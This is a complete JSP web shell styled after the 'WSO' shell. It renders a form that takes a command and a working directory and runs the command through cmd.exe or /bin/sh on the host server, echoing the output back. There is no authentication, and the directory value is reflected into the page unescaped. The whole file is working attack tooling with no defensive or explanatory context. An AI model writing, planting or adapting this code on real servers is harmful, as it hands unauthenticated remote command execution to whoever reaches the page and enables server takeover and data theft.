<%@ page import="java.io.*, java.util.*" %>
<%
    String cmd = request.getParameter("cmd");
    String dir = request.getParameter("dir");

    if (dir == null || dir.equals("")) dir = System.getProperty("user.dir");

    out.println("<html><body style='background-color:#111;color:#0f0;font-family:monospace;'>");
    out.println("<h2>JSP WebShell - WSO Style</h2>");
    out.println("<form method='GET'>");
    out.println("Command: <input type='text' name='cmd' style='width:300px;' /> ");
    out.println("Directory: <input type='text' name='dir' value='" + dir + "' style='width:300px;'/> ");
    out.println("<input type='submit' value='Execute' />");
    out.println("</form><hr>");

    if (cmd != null && !cmd.equals("")) {
        try {
            ProcessBuilder pb = new ProcessBuilder();
            pb.directory(new File(dir));
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                pb.command("cmd.exe", "/c", cmd);
            } else {
                pb.command("/bin/sh", "-c", cmd);
            }

            Process p = pb.start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            out.println("<pre>");
            while ((line = r.readLine()) != null) {
                out.println(line);
            }
            out.println("</pre>");
        } catch (Exception e) {
            out.println("<pre>Error: " + e.toString() + "</pre>");
        }
    }

    out.println("</body></html>");
%>
